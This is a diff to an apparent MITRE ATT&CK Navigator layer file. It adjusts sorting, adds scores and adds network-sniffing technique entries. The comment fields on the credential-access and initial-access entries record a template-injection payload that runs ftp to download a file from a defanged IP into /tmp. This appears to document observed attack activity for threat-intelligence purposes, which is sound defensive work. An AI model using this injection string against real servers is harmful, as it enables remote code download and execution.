@@ -22,7 +22,7 @@
 			"Network"
 		]
 	},
-	"sorting": "3",
+	"sorting": 0,
 	"layout": {
 		"layout": "side",
 		"showID": false,
@@ -33,6 +33,7 @@
 		{
 			"techniqueID": "T1555",
 			"tactic": "credential-access",
+			"score": 1,
 			"color": "#e60d0d",
 			"comment": "url=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un`') %]",
 			"enabled": true,
@@ -42,8 +43,29 @@
 		{
 			"techniqueID": "T1190",
 			"tactic": "initial-access",
+			"score": 1,
 			"color": "#e60d0d",
 			"comment": "url=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un`') %]",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1040",
+			"tactic": "credential-access",
+			"score": 3,
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1040",
+			"tactic": "discovery",
+			"score": 3,
+			"color": "",
+			"comment": "",
 			"enabled": true,
 			"metadata": [],
 			"showSubtechniques": false
